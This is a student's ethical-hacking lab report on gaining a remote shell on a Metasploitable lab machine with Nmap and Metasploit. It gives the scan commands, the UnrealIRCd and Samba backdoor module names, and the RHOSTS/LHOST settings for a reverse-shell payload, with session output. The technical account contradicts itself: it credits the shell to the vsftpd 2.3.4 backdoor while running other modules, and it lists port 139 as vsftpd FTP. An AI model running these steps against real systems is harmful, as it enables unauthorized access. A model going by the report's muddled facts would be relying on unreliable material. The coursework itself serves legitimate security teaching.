CSCI369 - Ethical Hacking Lab Report Document properties Version control Executive summary As part of the CSCI369: Ethical Hacking course at the University of Wollongong in Dubai (UOWD), this report outlines the practical application of remote exploitation techniques against a vulnerable system, carried out during the Week 8 lab session. The objective of this session was to exploit a known vulnerability in a target system using Metasploit, the industry-standard penetration testing framework, to simulate a real-world remote attack and understand the impact of publicly disclosed exploits. In this lab, we specifically targeted the vulnerable vsftpd v2.3.4 FTP service running on the Metasploitable virtual machine. The vulnerability, documented in public exploit databases and included in Metasploit�s modules, allows attackers to spawn a remote shell via a malicious backdoor triggered through crafted FTP login credentials. Using msfconsole, we conducted a reconnaissance scan with Nmap to confirm the exposed FTP service, then launched an exploit module from Metasploit targeting the vsftpd backdoor. Upon successful execution, a reverse shell session was established, granting remote access to the target machine without any valid credentials. The exploit demonstrated how attackers can gain a foothold using known CVEs and default configurations This lab reinforced key concepts in vulnerability exploitation, the critical importance of patch management, and how unauthenticated remote access vulnerabilities pose a significant security threat when unpatched services are left exposed to the network. It also demonstrated the power of automation tools like Metasploit in accelerating real-world attacks, as well as the simplicity with which attackers can compromise insecure systems. Lab Summaries and Findings Lab 7: Remote Exploitation with Metasploit Completed during Week 8 Objective: Exploit a known vulnerability in the vsftpd v2.3.4 FTP service on Metasploitable to gain remote shell access using Metasploit. Tools Used: Nmap, Metasploit (msfconsole) Key Findings / Reflection: During this lab, I discovered that the target system was running vsftpd version 2.3.4, which is known to contain a backdoor vulnerability. This vulnerability is dangerous because it allows an attacker to gain access to the system without needing a username or password meaning no authentication is required. To test this, I used the Metasploit Framework, which includes a built-in exploit module specifically for this version of vsftpd. With just a few simple commands and minimal setup, I was able to successfully exploit the system and get a remote shell. This gave me full access to the system as if I were logged in locally. It clearly shows how powerful public CVEs (Common Vulnerabilities and Exposures) can be if not patched. This exercise also made me realize how important it is to keep services up to date. If the server had been patched or updated to a safer version of vsftpd, the exploit wouldn�t have worked. Additionally, monitoring services like FTP and restricting their access (for example, through firewalls or access control) would make it harder for attackers to even find and exploit such weaknesses. In summary, this task highlighted how neglecting updates and not monitoring exposed services can lead to a full system compromise, even from a remote attacker using publicly known tools. Detailed Findings This section contains the detailed findings of week 7 lab Our Security Assessment Methodology is detailed further in Appendix A. Part 1: Scanning ports Step 1: Scanning Port 139 (Samba Service) nmap -p139 -sV 10.0.2.10 This scan targeted port 139 explicitly, which is commonly associated with Samba/NetBIOS services. Result: 139/tcp open ftp vsftpd 2.3.4 This indicated an open SMB service, which we explored but did not exploit during this session. Step 2: Scanning Port 6667 (IRC Service) nmap -p6667 -sV 10.0.2.10 This scan targeted IRC (Internet Relay Chat), which is known to be exploitable if UnrealIRCd is installed. Result: 6667/tcp open irc UnrealIRCd The presence of UnrealIRCd flagged a known backdoor vulnerability in older versions. Part 2: Exploiting UnrealIRCd Backdoor with Metasploit Transitioned to Metasploit to exploit the detected UnrealIRCd service. Step 1: Launching Metasploit and Finding the Exploit msfconsole search samba - (part 2) search UnrealIRCd - (part 3) I found the relevant module for exploitation: exploit/unix/irc/unreal_ircd_3281_backdoor (output from port 6667) exploit/multi/samba/usermap_script (this is output from port 139) Step 2: Module Configuration Use exploit/multi/samba/usermap_script - (part 2) use exploit/unix/irc/unreal_ircd_3281_backdoor - (part 3) set RHOSTS 10.0.2.10 set RPORT 6667 - (part 3) set RPORT 139 - (part 2) set PAYLOAD cmd/unix/reverse - (part 3) set LHOST 10.0.2.7 - (part 3) RHOSTS: Target IP RPORT: IRC service port (6667) PAYLOAD: Simple reverse shell for Unix LHOST: Kali Linux attack machine IP Step 3: Executing the Exploit run Output: [*] Started reverse TCP handler on 10.0.2.7:4444 [*] Command shell session 1 opened (10.0.2.7:4444 -> 10.0.2.10:38719) at ... I Successfully obtained a command shell on the remote system and tested with whoami and cat/home which showed the expected results. (see screenshots in proof of concepts) Risk: Remote Shell via FTP Backdoor (vsftpd 2.3.4) Observation: Exploiting IRC Backdoors This exercise simulated a targeted exploit against an outdated and vulnerable service exposed on a network. The use of Metasploit�s module allowed remote shell access by triggering a built-in backdoor in vsftpd 2.3.4. The process required minimal user interaction and no password, showing how impactful unpatched services can be. What I Learned / Achieved: Discovered and confirmed the presence of a vulnerable FTP service using Nmap. Understood how Metasploit simplifies the process of finding, configuring, and executing exploits. Gained root-level access to a remote machine without authentication through a known vulnerability. Reinforced the importance of timely patching and the dangers of default configurations. Impact Even with minimal attacker effort and knowledge, unauthorized access was quickly gained and once an account is compromised, it can serve as an initial foothold into a broader system compromise. Remediation Update and Patch: Immediately upgrade from vsftpd 2.3.4 to a secure version. This vulnerability is publicly documented and easily exploitable. Restrict Access: Limit network exposure of FTP services using firewall rules or VPN tunneling. Use Secure Alternatives: Consider replacing FTP with SFTP or FTPS, which provide encrypted communication and better security. Monitor Logs and Services: Implement intrusion detection systems to monitor for unauthorized access attempts or unusual port activity. Service Hardening: Disable unused or legacy services and follow the principle of least privilege in service configuration. References Rapid7. (n.d.). vsftpd v2.3.4 Backdoor Command Execution. Exploit Database. https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/ Gordon �Fyodor� Lyon. (2009). Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning. Insecure.Org. Nmap Reference Guide https://nmap.org/book/man.html Proof of concept 1 2 3 4 5 6 7 8 9 Appendix A: Security Assessment Methodology Reconnaissance Identification of live systems and exposed services using Nmap and service version detection. Enumeration Analysis of running services and version numbers to determine potential vulnerabilities. Exploitation Leveraging known vulnerabilities with automated tools (Metasploit) to gain unauthorized access. Post-Exploitation Shell interaction, verification of privilege level, and potential for lateral movement. Vulnerability Assessment Assessment of discovered vulnerabilities� impact and likelihood, mapped to real-world risks. Note: This report is submitted as part of academic coursework. All lab activity occurred in authorized, contrlled environments. Signature of Student: Date: 06/04/2025
